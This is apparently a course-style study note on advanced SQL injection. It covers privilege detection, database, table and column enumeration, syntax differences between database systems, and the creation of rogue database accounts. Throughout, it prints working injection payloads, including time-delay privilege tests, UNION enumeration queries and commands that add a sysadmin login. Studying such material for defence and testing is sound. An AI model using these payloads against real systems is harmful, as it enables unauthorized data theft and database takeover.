# 🧠 Advanced SQL Injection
The attacker does not stop at compromising an application’s data. The attacker will advance the SQL injection attack to compromise the underlying OS and network. Using the compromised application, the attacker can issue commands to the underlying OS to take over the target machine and use it as a staging post to attack the rest of the network. 

The attacker may interact with the OS to extract OS details and application passwords, execute commands, access system files, and so on. The attacker can further compromise the entire target network by installing Trojans and planting keyloggers.

## Database, Table, and Column Enumeration 
Attackers use various SQL queries to enumerate database, table names, and columns. The information obtained by the attacker after enumeration can be used to obtain sensitive data from the database, modify data (insert/update/delete), execute admin-level operations on the database, and even retrieve the content of a given file present on the DBMS file system. 

The following techniques are used by an attacker to perform enumeration: 

### Identify User Level Privilege 
Identifying user-level privileges through SQL injection is a common technique attackers use to understand what rights they have inside a database. Most databases provide built-in scalar functions such as `user`, `current_user`, `session_user`, and `system_user` that reveal the account currently connected to the system. By injecting these functions into queries, an attacker can determine if they are operating with normal user rights or higher-level privileges such as administrator or root.

For example, an attacker might inject:
```sql
' and 1 in (select user ) --
```
This forces the database to return information about the current user. If the response indicates the user is `dbo` (database owner) in SQL Server, the attacker may confirm this further with a delay command such as:
```sql
'; if user ='dbo' waitfor delay '0:0:5 '--
```
Here, the database pauses for 5 seconds if the logged-in account is `dbo`, confirming elevated privileges.

Similarly, in MySQL, attackers may use:
```sql
' union select if( user() like 'root@%', benchmark(50000,sha1('test')), 'false' );
```
This tests whether the current user is `root`. If true, the database will run a heavy operation (`benchmark`), slowing down the response and signaling to the attacker that they have root-level access.

Through these techniques, attackers can map out privilege levels and decide whether they can escalate their attack further, such as modifying data, creating new accounts, or taking full control of the database server.

### DB Administrators
Default administrator accounts include sa, system, sys, dba, admin, root, and many others. The dbo is a user that has implied permissions to perform all activities in the database. Any object created by any member of the sysadmin fixed server role belongs to dbo automatically.

### Discover DB Structure 
Determine table and column names 
```sql
' group by columnnames having 1=1 --
```
Discover column name types
```sql
' union select sum(columnname ) from tablename --
```
Enumerate user defined tables
```sql
' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --
```

### Column Enumeration in DB 
**MSSQL**
```sql
SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = 'tablename')
sp_columns tablename
```
**MySQL**
```sql
show columns from tablename
```
**Oracle**
```sql
SELECT * FROM all_tab_columns WHERE table_name='tablename'
```
**DB2**
```sql
SELECT * FROM syscat.columns WHERE tabname= 'tablename'
```
**PostgreSQL**
```sql
SELECT attnum,attname from pg_class, pg_attribute WHERE relname= 'tablename' AND pg_class.oid=attrelid AND attnum > 0
```

## Advanced Enumeration
Attackers use advanced enumeration techniques for system-level and network-level information gathering. The information gathered in the previous stage can be used to gain unauthorized access. An attacker can crack passwords using various tools such as L0phtCrack, John the Ripper, and so on. Attackers use buffer overflows to determine the vulnerabilities of a system or a network.

The following database objects are used for enumeration: 
| Oracle               | MS Access          | MySQL             | MSSQL Server   |
|-----------------------|-------------------|-------------------|----------------|
| SYS.USER_OBJECTS      | MSysAccessObjects | mysql.user        | sys.objects    |
| SYS.USER_TABLES       | MSysACEs          | mysql.db          | sys.columns    |
| SYS.USER_VIEWS        | MSysObjects       | mysql.tables_priv | sys.types      |
| SYS.ALL_TABLES        | MSysQueries       |                   | sys.databases  |
| SYS.USER_TAB_COLUMNS  | MSysRelationships |                   |                |

**Examples:**
- Tables and columns enumeration in one query
```sql
' union select 0, sys.objects.name + ': ' + sys.columns.name + ': ' + sys.types.name, 1, 1, '1', 1, 1, 1, 1, 1 from sys.objects, sys.columns, sys.types where sys.objects.xtype = 'U' AND sys.objects.id = sys.columns.id AND sys.columns.xtype = sys.types.xtype --
```
- Database Enumeration
  - Different databases in server
    ```sql
    ' and 1 in (select min(name) from master.dbo.sys.databases where name >'.' ) --
    ```
  - File location of databases
     ```sql
     ' and 1 in (select min(filename) from master.dbo.sys.databases where filename >'.' ) --
     ```

## Features of Different DBMS 
Different DBMS platforms support different features, and attackers take advantage of this once they know which database is in use. Variations in syntax for string concatenation, comments, unions, sub-queries, stored procedures, or access to system tables like information schema allow attackers to tailor their SQL injection techniques to match the specific database and increase the chances of a successful attack.

| Feature                                   | MySQL                         | MSSQL       | MS Access | Oracle         | DB2                         | PostgreSQL   |
|-------------------------------------------|-------------------------------|-------------|-----------|----------------|-----------------------------|--------------|
| **String Concatenation**                  | concat(,), concat_ws(delim,)  | ''+''         | ""&""       | ''\|\|''         | "concat" <br> ""+"" <br> ''\|\|''         | ''\|\|''       |
| **Comments**                              | --, /* */ and #               | -- and /* */| No        | -- and /* */   | --                          | -- and /* */ |
| **Request Union**                         | union                         | union and ; | union     | union          | union                       | union and ;  |
| **Sub-requests**                          | Yes                           | Yes         | No        | Yes            | Yes                         | Yes          |
| **Stored Procedures**                     | Yes                           | Yes         | Yes       | Yes            | Yes                         | Yes          |
| **Availability of information schema**    | Yes                           | Yes         | Yes       | Yes            | Yes                         | Yes          |

**Examples:**
- **MySQL**
  ```sql
  SELECT * from table where id = 1 union select 1,2,3
  ```
- **PostgreSQL**
  ```sql
  SELECT * from table where id = 1; select 1,2,3
  ```
- **Oracle**
  ```sql
  SELECT * from table where id = 1 union select null,null,null from sys.dual
  ```

## Creating Database Accounts 
The following are different ways of creating database accounts in various DBMS:
- **Microsoft SQL Server**
  ```sql
  exec sp_addlogin 'victor', 'Pass123' exec sp_addsrvrolemember 'victor', 'sysadmin'
  ```
- **Oracle**
  ```sql
  CREATE USER victor IDENTIFIED BY Pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users; GRANT CONNECT TO victor; GRANT RESOURCE TO victor;
  ```
- **Microsoft Access**
  ```sql
  CREATE USER victor IDENTIFIED BY 'Pass123'
  ```
- **MySQL**
  ```sql
  INSERT INTO mysql.user (user, host, password) VALUES ('victor', 'localhost', PASSWORD('Pass123'))
  ```
